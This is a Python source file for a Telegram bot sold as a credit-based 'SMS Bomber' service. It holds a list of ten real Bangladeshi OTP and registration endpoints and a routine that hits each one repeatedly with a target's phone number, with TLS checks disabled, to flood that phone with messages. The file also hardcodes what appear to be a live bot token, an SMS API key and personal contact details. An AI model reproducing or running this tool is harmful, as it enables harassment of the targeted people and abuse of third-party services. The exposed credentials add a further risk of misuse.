import os
import asyncio
import logging
import aiosqlite
import aiohttp
import json
import random
import ssl
import csv
import shutil
from datetime import datetime, timedelta
from telegram import Update, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = "8892555423:AAHcUvQgf2Y8byocmHuc9zgNLE-tD52nNL4"
ADMIN_ID = 1967494059
ADMIN_USERNAME = "RobiEntertainment"
OWNER_USERNAME = "RobiEntertainment"
SMS_API_URL = "https://api.paglahost.shop/Custom_SMS/api.php"
SMS_API_KEY = "Shuvo55356"

BASE_DIR = os.path.dirname(__file__)
DATA_DIR = os.path.join(BASE_DIR, "data")
LOGS_DIR = os.path.join(DATA_DIR, "logs")
BACKUP_DIR = os.path.join(DATA_DIR, "backups")
os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(LOGS_DIR, exist_ok=True)
os.makedirs(BACKUP_DIR, exist_ok=True)

DB_PATH = os.path.join(DATA_DIR, "bot_database.db")
LOG_FILE = os.path.join(LOGS_DIR, f"error_{datetime.now().strftime('%Y%m%d')}.log")

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[logging.FileHandler(LOG_FILE, encoding='utf-8'), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

API_LIMITS = {"daily_limit": 1000, "per_user_limit": 50, "api_call_interval": 0.8, "max_retries": 3}
CANCEL_FLAG = {}

WORKING_APIS = [
    {"name": "Paperfly", "method": "POST", "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", "body": {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}"}},
    {"name": "OsudPotro", "method": "POST", "url": "https://api.osudpotro.com/api/v1/users/send_otp", "body": {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"}},
    {"name": "Bohubrihi", "method": "POST", "url": "https://bb-api.bohubrihi.com/public/activity/otp", "body": {"phone": "{phone}", "intent": "login"}},
    {"name": "Jatri", "method": "POST", "url": "https://user-api.jslglobal.co/v2/send-otp", "body": {"phone": "+88{phone}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}},
    {"name": "RedX", "method": "POST", "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "body": {"mobile": "+88{phone}"}},
    {"name": "Qcoom", "method": "POST", "url": "https://auth.qcoom.com/api/v1/otp/send", "body": {"mobileNumber": "+88{phone}"}},
    {"name": "Training.gov.bd", "method": "POST", "url": "https://training.gov.bd/backoffice/api/user/sendOtp", "body": {"mobile": "{phone}"}},
    {"name": "Hoichoi", "method": "POST", "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", "body": {"phoneNumber": "{phone}", "requestType": "send", "emailConsent": True, "whatsappConsent": True}},
    {"name": "DeeptoPlay", "method": "POST", "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "body": {"email": "apkzone2.0@gmail.com", "phone_number": "88{phone}"}},
    {"name": "Chorki", "method": "POST", "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", "body": {"number": "+880{phone}"}},
]

def replace_phone(data, phone):
    if isinstance(data, dict):
        return {k: replace_phone(v, phone) for k, v in data.items()}
    elif isinstance(data, list):
        return [replace_phone(item, phone) for item in data]
    elif isinstance(data, str):
        return data.replace('{phone}', phone)
    return data

def check_success(text, status):
    if status in [200, 201, 202, 204]:
        return any(w in text.lower() for w in ['success', 'otp', 'sent', 'ok', 'true', '1', 'verified', 'done'])
    return False

async def get_user_status(user_id):
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT status FROM users WHERE user_id = ?", (user_id,)) as cur:
            row = await cur.fetchone()
            return row[0] if row else "active"

async def can_use_api(user_id):
    async with aiosqlite.connect(DB_PATH) as db:
        today = datetime.now().strftime('%Y-%m-%d')
        async with db.execute("SELECT COUNT(*) FROM api_usage WHERE user_id = ? AND DATE(usage_time) = ?", (user_id, today)) as cur:
            count = await cur.fetchone()
            return count[0] < API_LIMITS["per_user_limit"]

async def track_api_usage(api_name, user_id, success):
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                "INSERT INTO api_stats (api_name, total_calls, total_success, total_failed) VALUES (?,1,?,?) "
                "ON CONFLICT(api_name) DO UPDATE SET total_calls=total_calls+1, total_success=total_success+?, total_failed=total_failed+?, last_used=CURRENT_TIMESTAMP",
                (api_name, 1 if success else 0, 0 if success else 1, 1 if success else 0, 0 if success else 1)
            )
            await db.execute(
                "INSERT INTO user_api_stats (user_id, api_name, total_calls) VALUES (?,?,1) "
                "ON CONFLICT(user_id, api_name) DO UPDATE SET total_calls=total_calls+1, last_used=CURRENT_TIMESTAMP",
                (user_id, api_name)
            )
            await db.execute(
                "INSERT INTO api_usage (api_name, user_id, success) VALUES (?,?,?)",
                (api_name, user_id, 1 if success else 0)
            )
            await db.commit()
    except Exception as e:
        logger.error(f"Track API error: {e}")

async def admin_log(admin_id, action, target_id=None, details=""):
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                "INSERT INTO admin_logs (admin_id, action, target_id, details) VALUES (?,?,?,?)",
                (admin_id, action, target_id, details)
            )
            await db.commit()
    except Exception as e:
        logger.error(f"Admin log error: {e}")

async def backup_database():
    while True:
        await asyncio.sleep(21600)
        try:
            backup_file = os.path.join(BACKUP_DIR, f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db")
            shutil.copy2(DB_PATH, backup_file)
            logger.info(f"Backup created: {backup_file}")
        except Exception as e:
            logger.error(f"Backup failed: {e}")

def get_main_keyboard():
    return ReplyKeyboardMarkup(
        [["📨 Send SMS", "💣 SMS Bomber"], ["👤 My Profile", "🎁 Redeem Code"], ["📊 My Stats", "📞 Contact Admin"]],
        resize_keyboard=True
    )

def get_admin_keyboard():
    return ReplyKeyboardMarkup(
        [
            ["💰 Add Credit", "➖ Remove Credit"],
            ["🚫 Ban User", "✅ Unban User"],
            ["📣 Broadcast", "🎟️ Create Code"],
            ["📊 Live Stats", "📈 API Stats"],
            ["👥 Users List", "🏆 Top Users"],
            ["💰 Total Balance", "📋 API List"],
            ["🔄 Reset Limits", "📤 Export Data"],
            ["🗑️ Clear Logs", "📜 Admin Logs"],
            ["⏹ Cancel Bomb", "🔙 Back"]
        ],
        resize_keyboard=True
    )

def get_back_keyboard():
    return ReplyKeyboardMarkup([["🔙 Back"]], resize_keyboard=True)

def get_bombing_keyboard():
    return ReplyKeyboardMarkup([["⏹ Cancel Bomb"]], resize_keyboard=True)

# ===================== HANDLERS =====================
def start(update: Update, context: CallbackContext):
    user = update.effective_user
    asyncio.create_task(_start_db(update, context, user))

async def _start_db(update, context, user):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT OR IGNORE INTO users (user_id, username) VALUES (?,?)",
            (user.id, user.username or user.first_name)
        )
        await db.commit()
    if user.id == ADMIN_ID:
        update.message.reply_text(
            f"👑 Admin Panel\nWelcome {user.first_name}!",
            parse_mode="Markdown",
            reply_markup=get_admin_keyboard()
        )
    else:
        update.message.reply_text(
            f"🔥 Welcome {user.first_name}!\n💰 Balance: 10 Credits\n📡 APIs: {len(WORKING_APIS)}",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )

def check_status(func):
    def wrapper(update, context, *args, **kwargs):
        user_id = update.effective_user.id
        status = asyncio.run(get_user_status(user_id))
        if status == "banned":
            update.message.reply_text("🚫 You are banned!", parse_mode="Markdown")
            return
        return func(update, context, *args, **kwargs)
    return wrapper

@check_status
def cmd_sms(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not asyncio.run(can_use_api(user_id)):
        update.message.reply_text(
            f"❌ Daily limit exceeded! Max: {API_LIMITS['per_user_limit']}/day",
            parse_mode="Markdown"
        )
        return
    async def check_balance():
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT balance FROM users WHERE user_id=?", (user_id,)) as cur:
                row = await cur.fetchone()
                return row
    row = asyncio.run(check_balance())
    if not row or row[0] < 1:
        update.message.reply_text(
            f"❌ Insufficient credits! Contact @{ADMIN_USERNAME}",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        return
    update.message.reply_text(
        "📨 Send SMS\nEnter phone number (11 digits):",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['state'] = 'sms_number'

def sms_number(update: Update, context: CallbackContext):
    number = update.message.text.strip()
    if not number.isdigit() or len(number) != 11:
        update.message.reply_text("❌ Invalid! Enter 11 digits:", reply_markup=get_back_keyboard())
        return
    context.user_data['sms_number'] = number
    context.user_data['state'] = 'sms_message'
    update.message.reply_text(
        f"✅ Number: `{number}`\nNow enter your message:",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )

def sms_message(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    number = context.user_data.get('sms_number')
    msg = update.message.text
    if not number:
        update.message.reply_text("❌ Error! Start again.", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    update.message.reply_text(f"⏳ Sending to `{number}`...", parse_mode="Markdown")
    success = False
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        async def send():
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    SMS_API_URL,
                    params={"key": SMS_API_KEY, "number": number, "msg": msg},
                    timeout=30
                ) as resp:
                    text = await resp.text()
                    return "success" in text.lower()
        success = loop.run_until_complete(send())
        loop.close()
    except Exception as e:
        logger.error(f"SMS error: {e}")
    if success:
        async def update_db():
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("UPDATE users SET balance = balance - 1, total_sms = total_sms + 1 WHERE user_id = ?", (user_id,))
                await db.commit()
        asyncio.run(update_db())
        update.message.reply_text(
            f"✅ SMS sent to `{number}`!",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
    else:
        update.message.reply_text("❌ Failed to send SMS!", reply_markup=get_main_keyboard())
    context.user_data.clear()

@check_status
def cmd_bomber(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not asyncio.run(can_use_api(user_id)):
        update.message.reply_text(
            f"❌ Daily limit exceeded! Max: {API_LIMITS['per_user_limit']}/day",
            parse_mode="Markdown"
        )
        return
    update.message.reply_text(
        f"💣 SMS Bomber\nEnter target number (11 digits):\nAPIs: {len(WORKING_APIS)}",
        parse_mode="Markdown",
        reply_markup=get_bombing_keyboard()
    )
    context.user_data['state'] = 'bomber_number'

def bomber_number(update: Update, context: CallbackContext):
    number = update.message.text.strip()
    if not number.isdigit() or len(number) != 11:
        update.message.reply_text("❌ Invalid! Enter 11 digits:", reply_markup=get_bombing_keyboard())
        return
    context.user_data['bomber_number'] = number
    context.user_data['state'] = 'bomber_amount'
    update.message.reply_text(
        f"✅ Number: `{number}`\nEnter amount per API (1-20):",
        parse_mode="Markdown",
        reply_markup=get_bombing_keyboard()
    )

def bomber_amount(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    number = context.user_data.get('bomber_number')
    text = update.message.text.strip()
    if text == "⏹ Cancel Bomb":
        CANCEL_FLAG[user_id] = True
        update.message.reply_text("⏹ Cancelled!", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    try:
        amount = int(text)
        if amount < 1 or amount > 20:
            raise ValueError
    except:
        update.message.reply_text("❌ Enter a number between 1-20!", reply_markup=get_bombing_keyboard())
        return
    if not number:
        update.message.reply_text("❌ Error! Start again.", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    total_apis = len(WORKING_APIS)
    total_sms = total_apis * amount
    msg = update.message.reply_text(
        f"⏳ Bombing started!\nTarget: {number}\nTotal: {total_sms}",
        parse_mode="Markdown",
        reply_markup=get_bombing_keyboard()
    )
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    async def bomber_async():
        success_count = 0
        failed_count = 0
        CANCEL_FLAG[user_id] = False
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        connector = aiohttp.TCPConnector(ssl=ssl_context)
        api_results = []
        async with aiohttp.ClientSession(connector=connector) as session:
            for i, api in enumerate(WORKING_APIS, 1):
                if CANCEL_FLAG.get(user_id, False):
                    break
                api_success = 0
                api_failed = 0
                for j in range(amount):
                    if CANCEL_FLAG.get(user_id, False):
                        break
                    try:
                        body = replace_phone(api['body'], number)
                        headers = {
                            "User-Agent": "Mozilla/5.0",
                            "Accept": "application/json",
                            "Content-Type": "application/json"
                        }
                        await asyncio.sleep(random.uniform(0.8, 1.5))
                        if api['method'] == 'POST':
                            async with session.post(api['url'], json=body, headers=headers, timeout=15) as resp:
                                if check_success(await resp.text(), resp.status):
                                    api_success += 1
                                    success_count += 1
                                else:
                                    api_failed += 1
                                    failed_count += 1
                        else:
                            async with session.get(api['url'], headers=headers, timeout=15) as resp:
                                if resp.status in [200, 201, 202, 204]:
                                    api_success += 1
                                    success_count += 1
                                else:
                                    api_failed += 1
                                    failed_count += 1
                    except Exception as e:
                        api_failed += 1
                        failed_count += 1
                        logger.error(f"API error: {e}")
                    total_done = (i - 1) * amount + (j + 1)
                    if total_done % 10 == 0 or total_done == total_sms:
                        try:
                            msg.edit_text(
                                f"⏳ Bombing... {total_done}/{total_sms}\n✅ {success_count}  ❌ {failed_count}",
                                parse_mode="Markdown",
                                reply_markup=get_bombing_keyboard()
                            )
                        except:
                            pass
                api_results.append({'name': api['name'], 'success': api_success, 'failed': api_failed})
                await track_api_usage(api['name'], user_id, api_success > 0)
        success_rate = round((success_count / total_sms) * 100, 2) if total_sms else 0
        top = sorted(api_results, key=lambda x: x['success'], reverse=True)[:10]
        top_text = "\n".join([f"{idx+1}. {a['name']}: ✅{a['success']}" for idx, a in enumerate(top) if a['success'] > 0])
        if not top_text:
            top_text = "❌ No success"
        msg.edit_text(
            f"✅ Bombing Complete!\nTarget: {number}\nSuccess: {success_count}\nFailed: {failed_count}\nRate: {success_rate}%\n\n🏆 Top APIs:\n{top_text}",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        context.user_data.clear()
        CANCEL_FLAG.pop(user_id, None)
    loop.run_until_complete(bomber_async())
    loop.close()

@check_status
def profile(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    async def get_profile():
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute(
                "SELECT username, balance, total_sms, total_bombing, join_date, status FROM users WHERE user_id=?",
                (user_id,)
            ) as cur:
                return await cur.fetchone()
    row = asyncio.run(get_profile())
    if row:
        update.message.reply_text(
            f"👤 Profile\nID: {user_id}\nBalance: {row[1]}\nSMS: {row[2]}\nBomb: {row[3]}\nStatus: {row[5]}",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )

@check_status
def stats(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    async def get_stats():
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute(
                "SELECT balance, total_sms, total_bombing FROM users WHERE user_id=?",
                (user_id,)
            ) as cur:
                return await cur.fetchone()
    row = asyncio.run(get_stats())
    if row:
        update.message.reply_text(
            f"📊 Stats\nBalance: {row[0]}\nSMS: {row[1]}\nBomb: {row[2]}\nAPIs: {len(WORKING_APIS)}",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )

@check_status
def redeem(update: Update, context: CallbackContext):
    update.message.reply_text(
        "🎟 Enter redeem code:",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['state'] = 'redeem_code'

def redeem_process(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    code = update.message.text.strip().upper()
    async def process():
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT 1 FROM redeem_history WHERE user_id=? AND code=?", (user_id, code)) as cur:
                if await cur.fetchone():
                    return "already"
            async with db.execute("SELECT amount, usages FROM redeem_codes WHERE code=?", (code,)) as cur:
                row = await cur.fetchone()
                if not row or row[1] <= 0:
                    return "invalid"
                amount = row[0]
                await db.execute("UPDATE users SET balance = balance + ? WHERE user_id=?", (amount, user_id))
                await db.execute("UPDATE redeem_codes SET usages = usages - 1 WHERE code=?", (code,))
                await db.execute("INSERT INTO redeem_history (user_id, code) VALUES (?,?)", (user_id, code))
                await db.commit()
                return amount
    result = asyncio.run(process())
    if result == "already":
        update.message.reply_text("❌ Already used!", reply_markup=get_main_keyboard())
    elif result == "invalid":
        update.message.reply_text("❌ Invalid/expired!", reply_markup=get_main_keyboard())
    else:
        update.message.reply_text(f"🎉 +{result} credits!", reply_markup=get_main_keyboard())
    context.user_data.clear()

def contact(update: Update, context: CallbackContext):
    update.message.reply_text(
        f"📞 Admin: @{ADMIN_USERNAME}",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("Message", url=f"https://t.me/{ADMIN_USERNAME}")]
        ])
    )

# ===================== ADMIN HANDLERS (full set - simplified) =====================
def admin_add_credit(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID: return
    update.message.reply_text("💰 Add Credit\nFormat: ID AMOUNT", parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['admin_state'] = 'add_credit'

def admin_remove_credit(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID: return
    update.message.reply_text("➖ Remove Credit\nFormat: ID AMOUNT", parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['admin_state'] = 'remove_credit'

def admin_ban_user(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID: return
    update.message.reply_text("🚫 Ban User\nEnter user ID:", parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['admin_state'] = 'ban_user'

def admin_unban_user(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID: return
    update.message.reply_text("✅ Unban User\nEnter user ID:", parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['admin_state'] = 'unban_user'

def admin_broadcast(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID: return
    update.message.reply_text("📣 Broadcast\nSend your message:", parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['admin_state'] = 'broadcast'

def admin_create_code(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID: return
    update.message.reply_text("🎟️ Create Code\nFormat: CODE AMOUNT USAGES", parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['admin_state'] = 'create_code'

def admin_total_balance(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID: return
    async def get_total():
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT SUM(balance), COUNT(*), AVG(balance) FROM users") as cur:
                return await cur.fetchone()
    total, users, avg = asyncio.run(get_total())
    update.message.reply_text(
        f"💰 Total Balance\nUsers: {users}\nTotal: {total or 0}\nAvg: {round(avg or 0, 2)}",
        parse_mode="Markdown",
        reply_markup=get_admin_keyboard()
    )

def admin_top_users(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID: return
    async def get_top():
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT user_id, username, balance FROM users ORDER BY balance DESC LIMIT 10") as cur:
                return await cur.fetchall()
    users = asyncio.run(get_top())
    if not users:
        update.message.reply_text("No users", reply_markup=get_admin_keyboard())
        return
    text = "🏆 Top 10 Users\n"
    for i, u in enumerate(users, 1):
        text += f"{i}. ID: {u[0]}  💰{u[2]}\n"
    update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_admin_keyboard())

def admin_export_data(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID: return
    update.message.reply_text("⏳ Exporting...")
    try:
        async def get_users():
            async with aiosqlite.connect(DB_PATH) as db:
                async with db.execute("SELECT * FROM users") as cur:
                    return await cur.fetchall()
        users = asyncio.run(get_users())
        fname = f"users_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        with open(fname, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(['ID', 'Username', 'Balance', 'SMS', 'Bomb', 'Join', 'Status'])
            writer.writerows(users)
        update.message.reply_document(
            document=open(fname, 'rb'),
            caption="📤 Export",
            reply_markup=get_admin_keyboard()
        )
        os.remove(fname)
    except Exception as e:
        update.message.reply_text(f"❌ {e}", reply_markup=get_admin_keyboard())

def admin_reset_limits(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID: return
    global API_LIMITS
    API_LIMITS = {"daily_limit": 1000, "per_user_limit": 50, "api_call_interval": 0.8, "max_retries": 3}
    update.message.reply_text("🔄 Limits reset!", parse_mode="Markdown", reply_markup=get_admin_keyboard())

def admin_clear_logs(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID: return
    async def clear():
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("DELETE FROM admin_logs")
            await db.commit()
    asyncio.run(clear())
    update.message.reply_text("🗑️ Logs cleared!", reply_markup=get_admin_keyboard())

def admin_logs(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID: return
    async def get_logs():
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT admin_id, action, target_id, details, log_time FROM admin_logs ORDER BY log_time DESC LIMIT 20") as cur:
                return await cur.fetchall()
    logs = asyncio.run(get_logs())
    if not logs:
        update.message.reply_text("No logs", reply_markup=get_admin_keyboard())
        return
    text = "📜 Admin Logs\n"
    for log in logs:
        text += f"{log[4][:16]} {log[1]}"
        if log[2]: text += f" (Target: {log[2]})"
        text += "\n"
    update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_admin_keyboard())

def admin_live_stats(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID: return
    async def get_stats():
        async with aiosqlite.connect(DB_PATH) as db:
            total_calls = await db.execute("SELECT COUNT(*) FROM api_usage").fetchone()
            today_calls = await db.execute("SELECT COUNT(*) FROM api_usage WHERE DATE(usage_time)=DATE('now')").fetchone()
            total_success = await db.execute("SELECT COUNT(*) FROM api_usage WHERE success=1").fetchone()
            total_failed = await db.execute("SELECT COUNT(*) FROM api_usage WHERE success=0").fetchone()
            top = await db.execute("SELECT api_name, total_success, total_failed FROM api_stats ORDER BY total_success DESC LIMIT 5").fetchall()
            active = await db.execute("SELECT COUNT(DISTINCT user_id) FROM api_usage WHERE usage_time > datetime('now','-1 hour')").fetchone()
            return total_calls, today_calls, total_success, total_failed, top, active
    total_calls, today_calls, total_success, total_failed, top, active = asyncio.run(get_stats())
    text = f"📊 LIVE STATS\n{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\nTotal Calls: {total_calls[0]}\nToday: {today_calls[0]}\nActive (1h): {active[0]}\n✅ {total_success[0]}  ❌ {total_failed[0]}\n\n🏆 Top 5 APIs:\n"
    for i, a in enumerate(top, 1):
        total = a[1] + a[2]
        rate = round((a[1] / total) * 100, 2) if total else 0
        text += f"{i}. {a[0]}: ✅{a[1]} ❌{a[2]} ({rate}%)\n"
    update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_admin_keyboard())

def admin_api_stats(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID: return
    async def get_apis():
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT api_name, total_calls, total_success, total_failed, last_used FROM api_stats ORDER BY total_calls DESC") as cur:
                return await cur.fetchall()
    apis = asyncio.run(get_apis())
    if not apis:
        update.message.reply_text("No stats", reply_markup=get_admin_keyboard())
        return
    text = "📈 API Stats\n"
    for api in apis[:15]:
        rate = round((api[2] / api[1]) * 100, 2) if api[1] else 0
        text += f"{api[0]}: Calls={api[1]} ✅{api[2]} ❌{api[3]} ({rate}%)\n"
    update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_admin_keyboard())

def admin_users_list(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID: return
    async def get_users():
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT user_id, username, balance, status FROM users ORDER BY user_id DESC LIMIT 20") as cur:
                return await cur.fetchall()
    users = asyncio.run(get_users())
    if not users:
        update.message.reply_text("No users", reply_markup=get_admin_keyboard())
        return
    text = "👥 Recent Users\n"
    for u in users:
        text += f"ID: {u[0]}  💰{u[2]}  {u[3]}\n"
    update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_admin_keyboard())

def admin_api_list(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID: return
    text = f"📡 APIs: {len(WORKING_APIS)}\n" + "\n".join([f"{i+1}. {a['name']}" for i, a in enumerate(WORKING_APIS)])
    update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_admin_keyboard())

def admin_cancel_bomb(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID: return
    CANCEL_FLAG[update.effective_user.id] = True
    update.message.reply_text("⏹ Cancelled by admin!", reply_markup=get_admin_keyboard())

def admin_state_handler(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    msg = update.message.text
    state = context.user_data.get('admin_state')
    if state == 'add_credit':
        try:
            target, amount = map(int, msg.split())
            async def add():
                async with aiosqlite.connect(DB_PATH) as db:
                    await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, target))
                    await db.commit()
            asyncio.run(add())
            try:
                context.bot.send_message(target, f"🎉 +{amount} credits added!")
            except: pass
            asyncio.run(admin_log(user_id, "Added Credit", target, f"{amount}"))
            update.message.reply_text(f"✅ Added {amount} to {target}", reply_markup=get_admin_keyboard())
        except:
            update.message.reply_text("❌ Invalid! Use: ID AMOUNT", parse_mode="Markdown")
        context.user_data['admin_state'] = None
    elif state == 'remove_credit':
        try:
            target, amount = map(int, msg.split())
            async def remove():
                async with aiosqlite.connect(DB_PATH) as db:
                    await db.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (amount, target))
                    await db.commit()
            asyncio.run(remove())
            try:
                context.bot.send_message(target, f"⚠️ -{amount} credits removed!")
            except: pass
            asyncio.run(admin_log(user_id, "Removed Credit", target, f"{amount}"))
            update.message.reply_text(f"✅ Removed {amount} from {target}", reply_markup=get_admin_keyboard())
        except:
            update.message.reply_text("❌ Invalid! Use: ID AMOUNT", parse_mode="Markdown")
        context.user_data['admin_state'] = None
    elif state == 'ban_user':
        try:
            target = int(msg.strip())
            async def ban():
                async with aiosqlite.connect(DB_PATH) as db:
                    await db.execute("UPDATE users SET status = 'banned' WHERE user_id = ?", (target,))
                    await db.commit()
            asyncio.run(ban())
            try:
                context.bot.send_message(target, "🚫 You are banned!")
            except: pass
            asyncio.run(admin_log(user_id, "Banned User", target))
            update.message.reply_text(f"🚫 User {target} banned", reply_markup=get_admin_keyboard())
        except:
            update.message.reply_text("❌ Invalid ID!")
        context.user_data['admin_state'] = None
    elif state == 'unban_user':
        try:
            target = int(msg.strip())
            async def unban():
                async with aiosqlite.connect(DB_PATH) as db:
                    await db.execute("UPDATE users SET status = 'active' WHERE user_id = ?", (target,))
                    await db.commit()
            asyncio.run(unban())
            try:
                context.bot.send_message(target, "✅ You are unbanned!")
            except: pass
            asyncio.run(admin_log(user_id, "Unbanned User", target))
            update.message.reply_text(f"✅ User {target} unbanned", reply_markup=get_admin_keyboard())
        except:
            update.message.reply_text("❌ Invalid ID!")
        context.user_data['admin_state'] = None
    elif state == 'broadcast':
        async def get_users():
            async with aiosqlite.connect(DB_PATH) as db:
                async with db.execute("SELECT user_id FROM users WHERE status='active'") as cur:
                    return await cur.fetchall()
        users = asyncio.run(get_users())
        update.message.reply_text(f"⏳ Broadcasting to {len(users)} users...")
        success = 0
        for u in users:
            try:
                context.bot.send_message(u[0], f"📢 Broadcast\n\n{msg}", parse_mode='Markdown')
                success += 1
                time.sleep(0.05)
            except: pass
        asyncio.run(admin_log(user_id, "Broadcast", None, f"Sent to {success}"))
        update.message.reply_text(f"✅ Broadcast sent to {success} users!", reply_markup=get_admin_keyboard())
        context.user_data['admin_state'] = None
    elif state == 'create_code':
        try:
            parts = msg.split()
            code, amount, usages = parts[0].upper(), int(parts[1]), int(parts[2])
            async def create():
                async with aiosqlite.connect(DB_PATH) as db:
                    await db.execute("INSERT INTO redeem_codes (code, amount, usages, created_by) VALUES (?,?,?,?)", (code, amount, usages, user_id))
                    await db.commit()
            asyncio.run(create())
            asyncio.run(admin_log(user_id, "Created Code", None, f"{code}: {amount}x{usages}"))
            update.message.reply_text(f"✅ Code created!\n{code}\n{amount} credits\n{usages} uses", reply_markup=get_admin_keyboard())
        except:
            update.message.reply_text("❌ Invalid! Use: CODE AMOUNT USAGES", parse_mode="Markdown")
        context.user_data['admin_state'] = None

def handle_message(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    msg = update.message.text
    logger.info(f"📩 {user_id}: {msg}")
    if user_id == ADMIN_ID:
        if msg == "⏹ Cancel Bomb": admin_cancel_bomb(update, context); return
        if msg == "💰 Add Credit": admin_add_credit(update, context); return
        if msg == "➖ Remove Credit": admin_remove_credit(update, context); return
        if msg == "🚫 Ban User": admin_ban_user(update, context); return
        if msg == "✅ Unban User": admin_unban_user(update, context); return
        if msg == "📣 Broadcast": admin_broadcast(update, context); return
        if msg == "🎟️ Create Code": admin_create_code(update, context); return
        if msg == "💰 Total Balance": admin_total_balance(update, context); return
        if msg == "🏆 Top Users": admin_top_users(update, context); return
        if msg == "📤 Export Data": admin_export_data(update, context); return
        if msg == "🔄 Reset Limits": admin_reset_limits(update, context); return
        if msg == "🗑️ Clear Logs": admin_clear_logs(update, context); return
        if msg == "📜 Admin Logs": admin_logs(update, context); return
        if msg == "📊 Live Stats": admin_live_stats(update, context); return
        if msg == "📈 API Stats": admin_api_stats(update, context); return
